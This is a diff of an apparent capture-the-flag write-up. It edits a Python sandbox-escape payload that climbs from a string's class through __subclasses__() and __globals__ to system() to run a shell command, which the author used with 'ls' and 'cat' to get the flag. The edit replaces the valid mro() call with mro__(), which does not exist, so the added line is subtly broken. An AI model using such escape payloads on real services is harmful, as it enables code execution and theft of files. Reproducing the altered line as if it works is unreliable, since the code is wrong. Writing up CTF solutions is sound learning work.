@@ -44,7 +44,7 @@ Some websites that helped me:
 
 My main payload was this:
 
-```''.__class__.mro()[True].__subclasses__()[(True+True)*(True+True)*(True+True)*(True+True)*(True+True)*(True+True+True+True)+(True+True)*(True+True)*(True+True)*(True)+True].__init__.__globals__['system']('<SHELL COMMAND>')```
+```''.__class__.mro__()[True].__subclasses__()[(True+True)*(True+True)*(True+True)*(True+True)*(True+True)*(True+True+True+True)+(True+True)*(True+True)*(True+True)*(True)+True].__init__.__globals__['system']('<SHELL COMMAND>')```
 
 So first I did 'ls' to list all files in the directory, and then I used 'cat' to get the flag.
 
